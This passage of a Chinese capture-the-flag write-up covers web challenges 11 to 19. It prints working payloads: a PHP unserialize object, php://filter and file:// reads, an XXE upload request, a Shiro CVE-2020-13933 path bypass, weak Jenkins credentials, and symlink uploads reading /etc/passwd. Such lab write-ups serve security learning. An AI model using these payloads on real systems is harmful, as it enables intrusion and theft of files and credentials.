</span><span style="display:block;padding:0 1.25rem">Accept-Language: zh-CN,zh;q=0.9</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-11-unserialize" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-11-unserialize">#</a>web-11 unserialize</h3>
<p class="my-4 leading-7">题目提示给了两个参数file和data，file是一个文件包含命令，data的作用还不知道。</p>
<p class="my-4 leading-7">首先通过file将index.php的源码获取过来</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>http://10.167.34.63/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">base64解码后就变成了一个实际的代码审计题目</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">if(isset($_GET[&#x27;file&#x27;])){
</span><span style="display:block;padding:0 1.25rem">    $file = $_GET[&#x27;file&#x27;];
</span><span style="display:block;padding:0 1.25rem">    if(preg_match(&quot;/flag/i&quot;, $file)){
</span><span style="display:block;padding:0 1.25rem">        die(&quot;我知道你知道了文件位置，但请不要直接获取它&quot;);
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    else{
</span><span style="display:block;padding:0 1.25rem">        include &quot;$file&quot;;
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">class Example {
</span><span style="display:block;padding:0 1.25rem">    public $file;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    function __destruct() {
</span><span style="display:block;padding:0 1.25rem">        if(file_exists($this-&gt;file)) {
</span><span style="display:block;padding:0 1.25rem">            echo file_get_contents($this-&gt;file);
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">if (isset($_GET[&#x27;data&#x27;])) {
</span><span style="display:block;padding:0 1.25rem">    $s_data = $_GET[&#x27;data&#x27;];
</span><span style="display:block;padding:0 1.25rem">    $uns_data = unserialize($s_data);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    if ($uns_data instanceof Example) {
</span><span style="display:block;padding:0 1.25rem">        echo &quot;Data unserialized successfully.&quot;;
</span><span style="display:block;padding:0 1.25rem">    } else {
</span><span style="display:block;padding:0 1.25rem">        echo &quot;Invalid data.&quot;;
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">} else {
</span><span style="display:block;padding:0 1.25rem">    echo &quot;flag? Try file= or data= &quot;;
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">?&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">关键是对data处理，首先将data反序列化，然后Example在销毁的时候会自动打印 <strong class="font-semibold">$file</strong> 的内容。
于是就想到序列化构造一个数据，然后通过data反序列化来赋值 <strong class="font-semibold">$file</strong> 参数，最终获取flag内容。</p>
<p class="my-4 leading-7">构造Example序列化数据</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">print(&quot;Hello, World\n&quot;);
</span><span style="display:block;padding:0 1.25rem">class Example {
</span><span style="display:block;padding:0 1.25rem">    public $file = &quot;/flag.txt&quot;;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    function __destruct() {
</span><span style="display:block;padding:0 1.25rem">        if(file_exists($this-&gt;file)) {
</span><span style="display:block;padding:0 1.25rem">            echo file_get_contents($this-&gt;file);
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">$a = new Example();
</span><span style="display:block;padding:0 1.25rem">print(var_dump(serialize($a)));
</span><span style="display:block;padding:0 1.25rem">?&gt;
</span><span style="display:block;padding:0 1.25rem">// string(45) &quot;O:7:&quot;Example&quot;:1:{s:4:&quot;file&quot;;s:9:&quot;/flag.txt&quot;;}&quot;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">构造url执行</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>http://10.167.34.63/index.php?file=php://filter/read=convert.base64-encode/resource=index.php&amp;data=O:7:&quot;Example&quot;:1:{s:4:&quot;file&quot;;s:9:&quot;/flag.txt&quot;;}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-12-不安全的代理服务" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-12-不安全的代理服务">#</a>web-12 不安全的代理服务</h3>
<p class="my-4 leading-7">这个题没太懂，就是一个页面放了一会儿，刷刷的在跑流量。</p>
<p class="my-4 leading-7"><img alt="流量监测" src="/static/image/web-12-1.3456a265.png"/></p>
<p class="my-4 leading-7">发现有的public接口里附带了基本的认证参数，flag接口提示未认证。就想到重放flag接口，并添加认证参数。</p>
<p class="my-4 leading-7"><img alt="重放请求" src="/static/image/web-12-2.31758b04.png"/></p>
<p class="my-4 leading-7">成功获取了flag。</p>
<h3 id="web-13-php-audit" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-13-php-audit">#</a>web-13 php-audit</h3>
<p class="my-4 leading-7">php源码审计题目，发现禁止请求localhost，但是又告诉你flag在哪里</p>
<p class="my-4 leading-7"><img alt="php源码" src="/static/image/web-13-1.f0021423.png"/></p>
<p class="my-4 leading-7">利用curl的file协议，访问本地文件，构造url，获取flag</p>
<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="http://10.167.34.65/index.php?url=file:///var/www/html/flag.php" class="link-_707cf  link_3b154 inline-link_3b154">http://10.167.34.65/index.php?url=file:///var/www/html/flag.php</a></p>
<p class="my-4 leading-7"><img alt="结果" src="/static/image/web-13-2.376e413e.png"/></p>
<h3 id="web-14-jenkins" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-14-jenkins">#</a>web-14 jenkins</h3>
<p class="my-4 leading-7">给了一个jenkins系统，未登录。试了一下弱口令admin/admin，居然登录进去了。开始找能列目录的地方。找了几圈在节点管理里发现一个执行命令的输入框。</p>
<p class="my-4 leading-7"><img alt="jenkins脚本命令行" src="/static/image/web-14-1.637b6156.png"/></p>
<p class="my-4 leading-7">查找flag的位置，最后输出flag。</p>
<h3 id="web-15-一个blog" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-15-一个blog">#</a>web-15 一个blog</h3>
<p class="my-4 leading-7">文件包含，html里提供了包含的源码</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>$page = $_GET[&#x27;page&#x27;];
</span></span><span style="display:block;padding:0 1.25rem">$allowed_pages = array(&#x27;home&#x27;, &#x27;about&#x27;, &#x27;contact&#x27;);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">if(isset($page) &amp;&amp; !in_array($page, array(&#x27;flag&#x27;))){
</span><span style="display:block;padding:0 1.25rem">include($page . &#x27;.php&#x27;);
</span><span style="display:block;padding:0 1.25rem">} else {
</span><span style="display:block;padding:0 1.25rem">include(&#x27;home.php&#x27;);
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">可以发现，只要page参数不等于<code>flag</code>，就直接与.php拼接然后include进来。</p>
<p class="my-4 leading-7">所以，可以使用相对路径绕过对黑名单的判断<code>page=./flag</code></p>
<h3 id="web-16-认证绕过" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-16-认证绕过">#</a>web-16 认证绕过</h3>
<p class="my-4 leading-7">这个题刚开始无从下手，就在乱试。页面就提供了一个/doLogin接口和登录失败提示可以通过/flag/get获取flag。</p>
<p class="my-4 leading-7">开始想到sql注入，但是这个题目标题不像是通过sql进行操作的样子。于是就找响应的可以点。</p>
<p class="my-4 leading-7">有个可以点是/doLogin接口会将RememberMe的cookie删掉。通过这个关键词入手，发现shiro存在认证绕过漏洞。</p>
<p class="my-4 leading-7">有两类，一类是通过爆破Remember的加密方式，获取加密密钥修改权限。这个题目没有RememberMe的相关功能。</p>
<p class="my-4 leading-7">第二类是构造特殊路径，绕过shiro的权限对路径的判断。尝试了几个，发现CVE-2020-13933可以使用。成功获取flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>GET /flag/%3bget HTTP/1.1</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-17-文件解析器" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-17-文件解析器">#</a>web-17 文件解析器</h3>
<p class="my-4 leading-7">hint说可以解析xml。。。谷了一下有个Blind XXE实体引入的可以利用。而且也能正常回显。剩下的问题是flag的路径在哪里？随便猜了几个，运气好猜到了。。。</p>
<div class="language-http"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-http" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>POST /upload HTTP/1.1
</span></span><span style="display:block;padding:0 1.25rem">Host: 10.167.191.230:8080
</span><span style="display:block;padding:0 1.25rem">Content-Length: 361
</span><span style="display:block;padding:0 1.25rem">Cache-Control: max-age=0
</span><span style="display:block;padding:0 1.25rem">Upgrade-Insecure-Requests: 1
</span><span style="display:block;padding:0 1.25rem">Origin: http://10.167.191.230:8080
</span><span style="display:block;padding:0 1.25rem">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycLlwfudSbAubDEQp
</span><span style="display:block;padding:0 1.25rem">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
</span><span style="display:block;padding:0 1.25rem">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="display:block;padding:0 1.25rem">Referer: http://10.167.191.230:8080/
</span><span style="display:block;padding:0 1.25rem">Accept-Encoding: gzip, deflate
</span><span style="display:block;padding:0 1.25rem">Accept-Language: zh-CN,zh;q=0.9
</span><span style="display:block;padding:0 1.25rem">Connection: close
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">------WebKitFormBoundarycLlwfudSbAubDEQp
</span><span style="display:block;padding:0 1.25rem">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;island_extend.png&quot;
</span><span style="display:block;padding:0 1.25rem">Content-Type: image/svg+xml
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;!DOCTYPE test[
</span><span style="display:block;padding:0 1.25rem">&lt;!ENTITY file SYSTEM &quot;file:///flag.txt&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">]&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;reset&gt;&lt;login&gt;&amp;file;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">------WebKitFormBoundarycLlwfudSbAubDEQp--</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-18-self-gpt---1" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-18-self-gpt---1">#</a>web-18 SELF GPT - 1</h3>
<p class="my-4 leading-7">是个比较有名的开源项目 <a target="_blank" rel="noopener noreferrer" href="https://github.com/binary-husky/gpt_academic" class="link-_707cf  link_3b154 inline-link_3b154">https://github.com/binary-husky/gpt_academic</a> ，先下载代码看了一下。</p>
<p class="my-4 leading-7">issue里有人提到了项目存在漏洞，但是没有后文了。</p>
<p class="my-4 leading-7">然后就放在那里没有理它。。。</p>
<p class="my-4 leading-7">==================One Year Later================</p>
<p class="my-4 leading-7">想起来又拿出来看看。开始找python相关的漏洞。</p>
<ul class="list-disc pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">首先想到的是有没有调用系统shell执行命令的地方。发现了一个调用系统命令wget下载文献的地方，但是被注释了。</li>
<li class="[&amp;:not(:first-child)]:mt-2">项目使用了上传和解压压缩文件的功能。搜了一下，相关利用方式是上传一个带软链的目录，访问任意目录。</li>
<li class="[&amp;:not(:first-child)]:mt-2">上传的文件怎么下载下来。发现有个下载文件的接口，开放了<code>/tmp/gradio/[随机串]</code>的临时目录，和<code>private_upload/[日期时间]/[上传文件名]</code>的目录。只能访问到具体文件，没有列目录的能力。
<img alt="文件上传下载" src="/static/image/web-18-1.61f339bb.png"/></li>
<li class="[&amp;:not(:first-child)]:mt-2">然后开始构造软链，测试文件。
<ul class="list-disc pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">/etc/hosts 可以访问</li>
<li class="[&amp;:not(:first-child)]:mt-2">/etc/passwd 可以访问</li>
<li class="[&amp;:not(:first-child)]:mt-2">/home/work 没有内容</li>
<li class="[&amp;:not(:first-child)]:mt-2">../../.././xxxxxxxx/flag等可能的flag文件，没有找到</li>
<li class="[&amp;:not(:first-child)]:mt-2">/root/.bash_history 没有权限</li>
<li class="[&amp;:not(:first-child)]:mt-2">又试了几个目录，../的软链会递归，然后用根目录的软链的话，程序会卡死。。。</li>
</ul>
</li>
<li class="[&amp;:not(:first-child)]:mt-2">尝试了好多种方法没有突破。问题就卡在如何通过列目录找到flag文件（有点想放弃）</li>
<li class="[&amp;:not(:first-child)]:mt-2">猛然间想到要不从项目本身的文件找找突破口？
<img alt="自身文件" src="/static/image/web-18-2.58690020.png"/></li>
<li class="[&amp;:not(:first-child)]:mt-2">构造了一个返回上几级的软链，看了一下这几个文件的内容，最后终于在config.py发现了硬编码的flag。flag{9fdeb6b22d04f449360f99414397055e}
<img alt="config中的flag" src="/static/image/web-18-3.31324a34.png"/></li>
</ul>
<h3 id="web-19-粗心的程序员" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-19-粗心的程序员">#</a>web-19 粗心的程序员！</h3>
<p class="my-4 leading-7">这个题的点比较多，需要各个击破。</p>
<p class="my-4 leading-7">第一个点是vim，很容易想到了vim的交换文件，访问 <code>.index.php.swp</code> 获取到交换文件。</p>
<p class="my-4 leading-7">执行 <code>vim -r .index.php.swp</code> 还原出原文件。</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">include(&quot;conn.php&quot;);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">$username = addslashes($_GET[&quot;username&quot;]);
</span><span style="display:block;padding:0 1.25rem">$age = addslashes($_GET[&quot;age&quot;]);
</span><span style="display:block;padding:0 1.25rem">$password = addslashes($_GET[&quot;password&quot;]);
</span><span style="display:block;padding:0 1.25rem">$password1 = addslashes($_GET[&quot;password1&quot;]);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">$sql = &quot;SELECT username, age FROM user_info&quot;;
</span><span style="display:block;padding:0 1.25rem">$sub_sql = &quot; AND username = &#x27;{$username}&#x27;&quot;;
</span><span style="display:block;padding:0 1.25rem">$sql = sprintf(&quot;SELECT username, age FROM user_info WHERE age = &#x27;%s&#x27;&quot;.$sub_sql, $age);
</span><span style="display:block;padding:0 1.25rem">echo &quot;&lt;!--&quot;.$sql.&quot;--&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">$result = $conn-&gt;query($sql);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">if ($result-&gt;num_rows &gt; 0) {
</span><span style="display:block;padding:0 1.25rem">    while($row = $result-&gt;fetch_assoc()) {
</span><span style="display:block;padding:0 1.25rem">        if ($row[&quot;age&quot;] == 999 &amp;&amp; $password != $password1 &amp;&amp; md5($password) == md5($password1)) {
</span><span style="display:block;padding:0 1.25rem">                    echo &quot;Congratulations! Flag is &quot;.$flag;
</span><span style="display:block;padding:0 1.25rem">                    die();
</span><span style="display:block;padding:0 1.25rem">        } else {
</span><span style="display:block;padding:0 1.25rem">            echo &quot;My name is:&quot;.$row[&quot;username&quot;];
</span><span style="display:block;padding:0 1.25rem">            echo &quot;&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">            echo &quot;My Age is:&quot; . $row[&quot;age&quot;];
</span><span style="display:block;padding:0 1.25rem">            die();
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">} else {
</span><span style="display:block;padding:0 1.25rem">    echo &quot;My name is:&quot;.$row[&quot;username&quot;];
</span><span style="display:block;padding:0 1.25rem">            echo &quot;&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">            echo &quot;My Age is:&quot; . $row[&quot;age&quot;];
</span><span style="display:block;padding:0 1.25rem">            echo &quot;&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">            echo &quot;I am a coder. My favorite IDE is VIM, do you like it?&quot;;
</span><span style="display:block;padding:0 1.25rem">    die();
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">$conn-&gt;close();
</span><span style="display:block;padding:0 1.25rem">?&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" 